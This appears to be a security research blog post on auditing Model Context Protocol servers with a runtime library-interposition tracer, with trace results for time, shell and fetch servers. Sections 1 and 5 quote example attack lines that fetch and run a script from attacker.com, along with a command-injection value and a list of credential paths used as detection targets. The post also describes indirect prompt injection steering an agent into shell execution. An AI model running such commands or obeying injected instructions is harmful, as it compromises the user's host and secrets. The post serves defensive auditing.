# Auditing Real-World MCP Servers with `mcp-behave`: A Ground-Truth Comparative Study

*Why Static Registry Scanners Are Blind to Runtime Behavior and How Dynamic Library Interposition Observes Unconstrained Shell Access and Network Egress in Production Model Context Protocol Servers*

**By Navid Mirnouri**  
*November 2026*

---

## Executive Summary

The **Model Context Protocol (MCP)** has rapidly emerged as the universal standard connecting Large Language Models (LLMs)—from Claude Desktop and Cursor to custom enterprise agentic loops—with local databases, external APIs, and operating system tooling.

As thousands of open-source MCP servers flood registries like PyPI, npm, Glama, Smithery, and the official MCP Registry, a dangerous security assumption has become standard practice: **if a tool's JSON schema and description look benign, the tool is safe to install.**

Today, MCP server verification relies overwhelmingly on **static schema analysis**. Registries evaluate description clarity, parameter type hints, JSON-schema constraints, and metadata completeness. But static scanners suffer from a critical visibility gap: **they only read what the server *declares*, never what it *actually does* at runtime.**

In this experiment, we put this assumption to the test on **real-world, publicly published MCP servers from the wild** using **`mcp-behave`**, an open-source runtime behavioral auditor using user-space dynamic library interposition. We evaluate:

1. **The Safe Baseline**: `mcp-server-time` (Anthropic's official time server on PyPI).
2. **Privileged Host Capability**: `mcp-server-shell` (a published PyPI server that executes host commands via `subprocess.run(shell=True)`).
3. **Expected Network Egress**: `mcp-server-fetch` (testing dynamic outbound network socket observation).

Through non-invasive runtime dynamic tracing (via macOS `DYLD_INSERT_LIBRARIES` and Linux `LD_PRELOAD`), `mcp-behave` captures the exact system calls issued by each server during autonomous canary probing. We present the ground-truth results, analyze how runtime tracing informs investigation of known vulnerability classes like **CVE-2025-54073** and **CVE-2025-53110**, and outline why runtime behavioral auditing must become standard in agentic pipelines.

---

## 1. The Core Problem: The MCP Privilege Gap

When a developer configures an MCP server in Claude Desktop, Cursor, or an autonomous CLI agent:

```json
{
  "mcpServers": {
    "shell-helper": {
      "command": "python",
      "args": ["-m", "mcp_server_shell"]
    }
  }
}
```

That process does not run in an isolated browser sandbox or restricted hypervisor by default. **It executes locally with the developer's full operating system user account privileges.** It inherits the developer's `$HOME`, SSH keys in `~/.ssh`, cloud credentials in `~/.aws/credentials`, environment secrets (`.env`), and access to local network interfaces.

In the MCP specification, servers communicate over JSON-RPC (standard input/output or HTTP/SSE):
- `tools/list`: Declares available tools, human-readable descriptions, and JSON Schemas.
- `tools/call`: Dispatches a tool execution request with arguments supplied by the LLM.

### Why Static Schema Auditing Is Incomplete

Static scanners inspect the AST or the JSON manifest. They check whether types are valid and whether descriptions match conventions. However:

1. **Zero Runtime Visibility**: A tool declaring itself "purely local" can execute `urllib.request.urlopen("https://attacker.com")` inside its handler without altering its static manifest.
2. **The Prompt-Injection Multiplier**: While a developer might assume `execute_command` will only be used when they explicitly ask, an autonomous agent reading an external webpage, a git commit message, or a poisoned document can be hijacked via **indirect prompt injection** to invoke `execute_command({"command": "curl attacker.com/malware.sh | sh"})`.
3. **The Rug-Pull Threat**: A server may publish version 0.1.0 with a minimal, safe toolset, and later release version 0.1.1 adding unconstrained shell execution or data collection tools without notice.

To verify trust, we must observe ground-truth execution.

---

## 2. Architecture of `mcp-behave`: Dynamic Library Interposition

`mcp-behave` is designed as a zero-dependency, non-invasive runtime auditor that treats any MCP server as a black box.

```mermaid
flowchart TD
    CMD["Real MCP Server Command<br/>(e.g., mcp-server-time, mcp-server-shell)"] --> INJECT["Runtime Dynamic Library Interposition<br/>(macOS DYLD / Linux LD_PRELOAD)"]
    INJECT --> ENGINE["Autonomous Probing Engine"]
    ENGINE --> DISCOVER["Query tools/list & resources/list"]
    DISCOVER --> SYNTH["Schema-Aware Canary Synthesis<br/>(RFC-reserved domains, min constraints, defaults)"]
    SYNTH --> EXERCISE["Dispatch tools/call over stdio"]
    EXERCISE --> SINK["Intercept libc Calls to trace.log<br/>(F=open, N=connect, X=exec/posix_spawn)"]
    SINK --> ANALYZE["Differential Policy Analyzer<br/>(Declared vs. Observed Behavior)"]
    ANALYZE --> REPORT["Audit Verdict & Behavioral Profile<br/>(Exit Code 0 vs Exit Code > 0)"]
```

### Technical Foundations and Boundaries

1. **Non-Invasive C Library Interposition (User-Space, No Root Required)**:
   - On **macOS**, `mcp-behave` injects `libmcpbehave_trace.dylib` via `DYLD_INSERT_LIBRARIES`, interposing standard dynamic library entry points: `open`, `openat`, `connect`, `execve`, `execv`, and `posix_spawn`.
   - On **Linux**, it injects `libmcpbehave_trace.so` via `LD_PRELOAD` (with fallback to `strace` when available).
   - The trace sink writes directly to a private descriptor (`$MCP_BEHAVE_TRACE_FILE`), ensuring stdout remains purely dedicated to JSON-RPC traffic.
2. **Architectural Scope & Limitations**:
   - Because `mcp-behave` operates via dynamic library interposition, it intercepts calls made through standard dynamically linked C libraries (which covers mainstream Python, Node.js, and Ruby interpreters). It does *not* intercept direct inline kernel syscalls or statically compiled binaries that bypass libc entirely unless run with the Linux `strace` backend.
3. **Schema-Aware Canary Synthesis**:
   - Instead of static mock testing, `mcp-behave` reads each tool's JSON Schema at runtime.
   - It synthesizes valid arguments respecting `format` (URIs, emails, dates), `minimum` constraints, and schema `default` values, injecting canary identifiers (`canary-input`, `http://example.com/`, `/tmp/probe-canary.txt`).
4. **Differential Scope Analysis**:
   - **Network Egress**: Detects outbound TCP/UDP `connect()` calls. If a tool claims "local" or "offline" in its description, undeclared egress is flagged as **HIGH** severity.
   - **Sensitive File Access**: Detects accesses to credential stores (`~/.ssh`, `id_rsa`, `.env`, `.aws/credentials`, `.kube`, `/etc/shadow`).
   - **Subprocess Spawns**: Detects host process creation (`/bin/sh`, `git`, external binaries).
   - **Manifest Rug-Pull Detection**: Computes a cryptographic SHA-256 fingerprint of declared capabilities and alerts if a server silently expands its surface across runs.

---

## 3. The Experiments: Testing Real-World MCP Servers

We tested three real, publicly published packages from PyPI:
1. `mcp-server-time` (Anthropic Official, v2026.11.11)
2. `mcp-server-shell` (Community Shell Executor, v0.1.0)
3. `mcp-server-fetch` (Anthropic Official, v2026.11.11)

### Experiment A: Auditing the Safe Baseline (`mcp-server-time`)

`mcp-server-time` is Anthropic's reference implementation for providing local date and time utilities.

#### Execution

```bash
mcp-behave /tmp/audit_env/bin/mcp-server-time
```

#### Output and Observations

```
=== STEP 1: observe (macos-dylib) ===
[probe] discovered 3 tool(s)
[probe] calling tool get_current_time({"timezone": "Asia/Tehran"})
[probe] calling tool convert_time({"source_timezone": "Asia/Tehran", "time": "canary-input", "target_timezone": "Asia/Tehran"})
[probe] calling tool get_time_ago({"timezone": "Asia/Tehran", "days_ago": 0, "hours_ago": 0, "minutes_ago": 0, "seconds_ago": 0})
[probe] discovered 0 resource(s)
[probe] discovered 0 prompt(s)
[probe] manifest -> /tmp/mcp_behave_out/manifest.json
[probe] trace    -> /tmp/mcp_behave_out/trace.log
=== STEP 2: declared-vs-observed diff ===

  target tools: get_current_time, convert_time, get_time_ago
  resources:    0, prompts: 0
  declared scope hints: none
  --------------------------------------------------------
  no declared-vs-observed deviations detected
```

#### Raw Trace Analysis (`trace.log`)

Examining the low-level trace reveals exactly what `mcp-server-time` touched during execution:

```
F /System/Library/CoreServices/SystemVersion.plist
F /Users/.../miniforge3/share/zoneinfo/Asia/Tehran
F /etc/conf.d/clock
F /etc/sysconfig/clock
F /etc/timezone
F /var/db/zoneinfo
```

- **Files Opened**: 572 total libc `open()` calls. 565 were filtered as standard runtime library noise (Python site-packages and C extensions). The remaining 7 were legitimate OS timezone database files (`/etc/timezone`, `/var/db/zoneinfo`).
- **Network Sockets**: **0** (`connect()` was never invoked).
- **Subprocesses Spawned**: **0** (`execve` was never invoked).
- **Sensitive Credentials**: **0** (No `.ssh`, `.aws`, or `.env` paths accessed).
- **Audit Verdict**: **PASS (Clean)**. Exit code `0`.

---

### Experiment B: Privileged Host Capability (`mcp-server-shell`)

`mcp-server-shell` (published on PyPI: `mcp-server-shell==0.1.0`) is a package intended to give models terminal access.

#### Implementation

Inspection of `server.py` in the package source reveals:

```python
class ShellServer:
    def execute_command(self, command: str) -> CommandResult:
        logger.info(f"Executing command: {command}")
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True
        )
        return CommandResult(...)
```

The server passes the tool argument directly to Python's `subprocess.run(command, shell=True)`.

#### Security Nuance: Capability vs. Malice

Here, an important security distinction is necessary:

**Spawning `/bin/sh` is not an exploit; it is the tool's advertised function.** The tool explicitly advertises that it executes shell commands, and it uses Python's standard `subprocess.run(shell=True)` to fulfill that contract.

However, from a security architecture perspective, running `mcp-behave` against this live package observes the true privilege tier of the server:

```bash
mcp-behave /tmp/audit_env/bin/python -m mcp_server_shell
```

#### Output and Observations

```
=== STEP 1: observe (macos-dylib) ===
2026-11-18 09:07:41,339 - INFO - Starting MCP shell server...
2026-11-18 09:07:41,344 - INFO - Server started and ready to handle requests
[probe] discovered 1 tool(s)
[probe] calling tool execute_command({"command": "canary-input"})
2026-11-18 09:07:41,349 - INFO - Executing command: canary-input
[probe] discovered 0 resource(s)
[probe] discovered 0 prompt(s)
[probe] manifest -> /tmp/mcp_behave_out/manifest.json
[probe] trace    -> /tmp/mcp_behave_out/trace.log
=== STEP 2: declared-vs-observed diff ===

  target tools: execute_command
  resources:    0, prompts: 0
  declared scope hints: none
  --------------------------------------------------------
  [i] INFO spawned subprocess: /bin/sh
```

#### Raw Trace Analysis

In `trace.log`, `mcp-behave`'s libc tracer caught:

```
X /bin/sh
X /bin/sh
```

- **Observed Behavior**: The server spawned `/bin/sh` to interpret the command.
- **Security Assessment**: `execute_command` exposes an unconstrained shell on the host OS. Spawning `/bin/sh` is consistent with its declared functionality, but the absence of an authorization or sandboxing boundary means that if an autonomous agent with access to this tool processes untrusted external input (such as an indirect prompt injection in a README or webpage), this privileged capability can be invoked with arbitrary payloads.

---

### Experiment C: Expected Network Egress (`mcp-server-fetch`)

To evaluate network observation against production code, we audited `mcp-server-fetch` (Anthropic Official, v2026.11.11).

```bash
mcp-behave /tmp/audit_env/bin/mcp-server-fetch --no-readability-js
```

#### Output and Observations

```
=== STEP 1: observe (macos-dylib) ===
[probe] discovered 1 tool(s)
[probe] calling tool fetch({"url": "http://example.com/", "max_length": 5000, "start_index": 0, "raw": false, "timeout_ms": 30000})
HTTP Request: GET http://example.com/robots.txt "HTTP/1.1 404 Not Found"
HTTP Request: GET http://example.com/ "HTTP/1.1 200 OK"
[probe] discovered 0 resource(s)
[probe] discovered 1 prompt(s)
[probe] manifest -> /tmp/mcp_behave_out/manifest.json
[probe] trace    -> /tmp/mcp_behave_out/trace.log
=== STEP 2: declared-vs-observed diff ===

  target tools: fetch
  resources:    0, prompts: 1
  declared scope hints: none
  --------------------------------------------------------
  [i] INFO network egress to 172.66.147.243:80
```

**Context**: Fetching websites is exactly what `mcp-server-fetch` is designed to do. Outbound socket connection to `172.66.147.243:80` is expected behavior, not suspicious activity.

The experiment proves **observational fidelity**: the tracer intercepted the dynamic libc `connect()` call to remote socket `172.66.147.243:80`. This provides the foundation for future policy enforcement:
- Distinguishing expected egress (public domain requested by probe).
- Detecting unexpected egress (tools claiming offline operation).
- Verifying protection against restricted destinations (e.g. cloud metadata services `169.254.169.254` or private RFC 1918 subnets).

---

## 4. Comparison Matrix: Observed Runtime Profiles

| Dimension | `mcp-server-time` | `mcp-server-fetch` | `mcp-server-shell` |
| :--- | :--- | :--- | :--- |
| **Origin / Source** | Anthropic Official (PyPI) | Anthropic Official (PyPI) | Community (PyPI) |
| **Declared Purpose** | Date & Time conversions | Web page retrieval & Markdown conversion | Shell command execution |
| **Tools Probed** | 3 (`get_current_time`, `convert_time`, `get_time_ago`) | 1 (`fetch`) | 1 (`execute_command`) |
| **Observed File Opens** | 572 total (7 OS zoneinfo paths) | 610 total (HTTP/SSL cert stores) | 593 total (system plists) |
| **Observed Network Egress** | **0 sockets** | **1 socket** (`172.66.147.243:80`) | **0 sockets** |
| **Observed Subprocesses** | **0** | **0** | **1 host shell (`/bin/sh`)** |
| **Privilege Tier** | Contained (In-memory computation) | Network Egress (Outbound HTTP) | Host Subprocess Execution |
| **mcp-behave Verdict** | Clean Baseline (Exit 0) | Expected Egress Observed (Exit 0) | Privileged Capability Observed (Exit 0) |

---

## 5. How Runtime Tracing Can Help Investigate Known MCP Vulnerability Classes

The behavioral patterns surfaced above directly illuminate two major vulnerability classes that emerged in published MCP packages during 2025 and 2026. While the specific exploits below were not executed in our control run, examining their mechanics demonstrates how runtime behavioral observation complements static linting:

### Vulnerability Class A: Command Injection (e.g., CVE-2025-54073 in `mcp-package-docs`)
- **The Flaw**: In `mcp-package-docs` (npm), unsanitized user inputs were concatenated directly into shell arguments passed to Node's `child_process.exec()`. An attacker providing a package name containing shell metacharacters (e.g. `react; curl attacker.com/sh | sh`) achieved arbitrary command execution.
- **Static Scanner Limitation**: The tool manifest declared `package_name: string`. AST linters saw standard type annotations and a legitimate tool description. Nothing in the schema indicated dangerous behavior.
- **Runtime Tracing Contribution**: In an audit environment, dynamic library interposition intercepts `posix_spawn` or `execve` calls. When an execution probe sends synthetic metacharacter sequences, the immediate appearance of `/bin/sh` executing secondary binaries provides an unambiguous signal of command concatenation before deployment.

### Vulnerability Class B: Path Traversal (e.g., CVE-2025-53110 in Filesystem MCP)
- **The Flaw**: Path validation logic in directory prefix matching allowed attackers to access files outside the allowed directory when two directory names shared common prefixes (e.g. `/workspace_allowed` vs `/workspace_allowed_secret`), or via relative traversal sequences.
- **Static Scanner Limitation**: The tool declared standard file management functions (`read_file`, `write_file`) with valid string paths.
- **Runtime Tracing Contribution**: `mcp-behave` monitors every `open()` and `openat()` libc call against both the declared workspace root and a curated list of sensitive credential paths (`~/.ssh`, `id_rsa`, `.aws/credentials`, `.env`, `/etc/shadow`). When canary probes attempt path traversal, any libc read targeting a sensitive file triggers an immediate **HIGH** severity alert.

---

## 6. Implementation Deep-Dive: Intercepting Subprocesses on Modern OSes

During our testing of real servers on macOS Apple Silicon, we encountered a subtle engineering hurdle in tracing Python subprocesses:

When Python invokes `subprocess.run(shell=True)`:
1. Python calls `_posixsubprocess.fork_exec()`.
2. In the forked child process, Python's runtime runs `close_open_fds()` to close all inherited file descriptors (default `close_fds=True`).
3. This action closed the tracer's active log descriptor (`g_trace_fd`) inside the child.
4. When `execv` or `execve` was called immediately thereafter, logging attempts failed with `EBADF`.

### The Fix in `macos_tracer.c`

To improve trace reliability across child forks, `mcp-behave` detects descriptor invalidation and re-opens the trace log with atomic append semantics:

```c
static void emit(const char *buf, size_t len) {
    if (g_trace_fd < 0) {
        const char *path = getenv("MCP_BEHAVE_TRACE_FILE");
        if (path && *path) g_trace_fd = open(path, O_WRONLY | O_APPEND | O_CREAT, 0600);
    }
    if (g_trace_fd < 0) return;
    ssize_t w = write(g_trace_fd, buf, len);
    if (w < 0) {
        /* If write fails because child closed descriptors before exec, re-open */
        const char *path = getenv("MCP_BEHAVE_TRACE_FILE");
        if (path && *path) {
            int fd = open(path, O_WRONLY | O_APPEND | O_CREAT, 0600);
            if (fd >= 0) {
                (void)!write(fd, buf, len);
                g_trace_fd = fd;
            }
        }
    }
}
```

This significantly improves subprocess-event reliability when child processes close inherited trace descriptors before execution. For standard dynamically linked runtimes (Python, Node.js) that execute subprocesses via libc's `posix_spawn`, `execve`, or `execv`, atomic reopening ensures that fork-and-exec sequences are faithfully logged without losing records to `EBADF`.

---

## 7. Evolution: From Behavior Observer to Security Policy Platform

| Capability Area | mcp-behave Today (Observer) | Next Phase (Policy Platform) |
| :--- | :--- | :--- |
| **Filesystem** | Detects and filters libc `open()` calls; alerts on sensitive paths | Enforces strict directory boundary policies per tool |
| **Network** | Detects outbound `connect()` IP/port; alerts if claimed offline | Evaluates domain and CIDR allowlists; blocks private IP egress |
| **Execution** | Detects subprocess launches (`/bin/sh`, binaries) | Enforces sandboxing profiles (e.g. seatbelt / landlock / bubblewrap) |
| **Integrity** | Computes SHA-256 manifest hashes to catch rug-pulls across runs | Continuous registry verification and automated regression diffs |

### Actionable Guidance
1. **For MCP Registry Operators (Glama, Smithery, Official Registry)**: Mandate dynamic behavioral audits in ingestion pipelines. Ground badges in empirical facts: *0 network sockets observed*, *0 subprocesses spawned*, *strict path isolation verified*.
2. **For Developers & Enterprises Using MCP**: Never run unaudited third-party MCP servers on bare metal with access to unconstrained shell execution without sandbox boundaries. Integrate `mcp-behave` in CI/CD using the `--json` flag.
3. **For MCP Authors**: Implement explicit sandboxes, avoid raw shell expansion, and declare network requirements transparently in server metadata.

---

## Conclusion

The Model Context Protocol gives AI agents extraordinary superpowers, but also grants third-party code direct access to our development environments.

Static schema inspection is fundamentally incomplete: it guarantees syntactic correctness, but says nothing about runtime honesty. As demonstrated by our audits of `mcp-server-time`, `mcp-server-fetch`, and `mcp-server-shell`, **runtime behavioral tracing with dynamic library interposition provides the empirical ground-truth required to separate safe, well-behaved tools from high-privilege execution vectors.**

Before connecting your next MCP server to Claude Desktop or Cursor, don't just read the schema. **Observe what it actually does.**

---

*The open-source `mcp-behave` auditor is available at: [https://github.com/navid72m/mcp-behave](https://github.com/navid72m/mcp-behave)*
